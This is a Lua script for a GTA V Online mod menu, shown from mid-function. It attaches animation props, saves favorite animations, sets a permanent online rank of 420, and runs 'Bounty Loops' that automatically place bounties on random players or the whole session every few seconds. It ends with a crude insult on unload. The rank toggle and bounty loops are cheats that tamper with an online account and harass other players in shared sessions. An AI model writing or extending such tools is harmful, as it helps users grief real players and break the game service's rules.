        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        for _, propData in ipairs(props) do
            local boneIndex = PED.GET_PED_BONE_INDEX(ped, propData.Bone)
            local hash = util.joaat(propData.Prop)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end
            local object = entities.create_object(hash, pos)
            animAttachments[object] = propData.DeleteOnEnd ~= nil
            ENTITY.ATTACH_ENTITY_TO_ENTITY(
                object, ped, boneIndex,
                propData.Placement[1] or 0.0,
                propData.Placement[2] or 0.0,
                propData.Placement[3] or 0.0,
                propData.Placement[4] or 0.0,
                propData.Placement[5] or 0.0,
                propData.Placement[6] or 0.0,
                false,
                true,
                false,
                true,
                1,
                true
            )
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        end
    end
    TASK.TASK_PLAY_ANIM(ped, group, animation, 8.0, 8.0, duration, flags, 0.0, false, false, false)
end

------------------------------
-- Loading & Saving Favorites
--------------------------------
local path = filesystem.stand_dir() .. "/Favorite Animations.txt"
if filesystem.exists(path) then
    local headerRead = false
    for line in io.lines(path) do
        if headerRead then
            chunks = {}
            for substring in string.gmatch(line, "%S+") do
                table.insert(chunks, substring)
            end
            if #chunks == 2 or #chunks == 3 then
                table.insert(favorites, chunks)
            end
        else
            headerRead = true
        end
    end
    populate_favorites()
end
function save_favorites()
    local file = io.open(path, "w")
    file:write("category\t\tanimation name\t\talias (no spaces)\n")
    for _, favorite in ipairs(favorites) do
        if favorite[3] then
            file:write(string.format("%s %s %s\n", favorite[1], favorite[2], favorite[3]))
        else
            file:write(string.format("%s %s\n", favorite[1], favorite[2]))
        end
    end
    file:close()
end

----------------------------------------------------------------------------------------------------------------


	menu.toggle(misc, "Rank 420", {"rank"}, "Note: If you save the profile with it toggled it will give you pemanant 420 rank", function(on_toggle)
		notification("Setting Rank 420...", colors.red)
		menu.trigger_commands("setrank" .. " 420")
	end)

	menu.toggle(misc, "Halloween FPS Boost", {"fpsboost"}, "Wait a few seconds for 5-10 FPS Boost.", function(on_toggle)
	if on_toggle then
		notification("Setting FPS...", colors.green)
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
    		menu.trigger_commands("noidlekick ")
    		menu.trigger_commands("noidlecam ")
	else
		notification("Resetting FPS...", colors.red)
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
    		menu.trigger_commands("noidlekick ")
    		menu.trigger_commands("noidlecam ")
		end
	end)

	menu.toggle(misc, "Halloween FPS Boost No Sky", {"fpsnsboost"}, "Wait a few seconds 10-15 FPS Boost.", function(on_toggle)
	if on_toggle then
		notification("Setting FPS...", colors.green)
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
    		menu.trigger_commands("potatomode ")
    		menu.trigger_commands("nosky ")
    		menu.trigger_commands("noidlekick ")
    		menu.trigger_commands("noidlecam ")
	else
		notification("Resetting FPS...", colors.red)
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
    		menu.trigger_commands("potatomode ")
    		menu.trigger_commands("nosky ")
    		menu.trigger_commands("noidlekick ")
    		menu.trigger_commands("noidlecam ")
		end
	end)

bountyloop = menu.list(misc, "Bounty Loops", {}, "", function(); end)

--coded by MrWall 


util.show_corner_help("~s~Loaded ~o~ " .. SCRIPT_FILENAME .. " ~p~;)\n~s~Let's farm some ~g~$$$")

function on_stp()
	util.show_corner_help("~r~Unloaded ~o~ " .. SCRIPT_FILENAME .. "\n~s~Thanks for using ~p~:D")
end


local playerList = players.list(false, true, true)
local notify = false
local amount = {1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000}
local randomamount = 10000


--Header
menu.divider(bountyloop, "Bounty Loops")

--Waiting time
delay = 30
menu.slider(bountyloop, "Repeat Colldown", {"bdelay"}, "Set the time on how long the script waits to give the next player a bounty (time is in sec)", 10, 300, delay, 5, function(value)
	delay = value
end)

--Random Amount
function random_pay()
	while randomamount <= 10000  do
		randomamount = amount[math.random(#amount)]
		util.yield(delay * 100)
	end
	return randomamount 
end

menu.toggle(bountyloop, "Random payout¿", {}, "Set random pay bounty loops\n\nActive = random", function(d)
	if d then
		random_pay()
	else
		randomamount = 10000
	end
end)

menu.toggle(bountyloop, "Notifications Off", {}, "By default notifications are turned OFF", function(on)
	if on then
		notify = true
		util.show_corner_help("~p~Notifications ~g~On")
	else
		notify = false
		util.show_corner_help("~p~Notifications ~r~Off")
	end
end)


--Bounty Toggle
menu.toggle_loop(bountyloop, "Start Loops", {}, "Will get a random players and give them bounty on set time", function()
	if #playerList > 0 then
		randomPlayer = players.get_name(playerList[math.random(1, #playerList)])
		menu.trigger_commands("bounty" .. randomPlayer .. " " .. randomamount)
		if notify then
			util.show_corner_help("~o~Bounty placed~y~... \n~r~$ ~w~= " .. randomamount)
			if not util.BEGIN_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED("~p~Notifications ~g~On") then
				util.show_corner_help("~o~Bounty placed~y~... \n~r~$ ~w~= " .. randomamount)
			end
		end
			util.yield(delay * 1000)
	else
		util.show_corner_help("Lobby has ~r~no ~w~other ~o~players.\n\n~w~Consider ~g~joining ~w~a ~g~new one.")
		util.yield(60000)
	end
end)



enabled = false
menu.toggle(bountyloop, "Infinite bountys Loop", {"infinibounty"}, "Places a 10k bounty on the entire session again and again.", function(on)
    if on then
        enabled = true
    else
        enabled = false
    end
end, false)

while true do
    if enabled then
        menu.trigger_commands("bountyall 10000")
    end
    util.yield(10000)
end

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
util.on_stop(function()
	notification("Later pussy (Yawn)", colors.red)
end)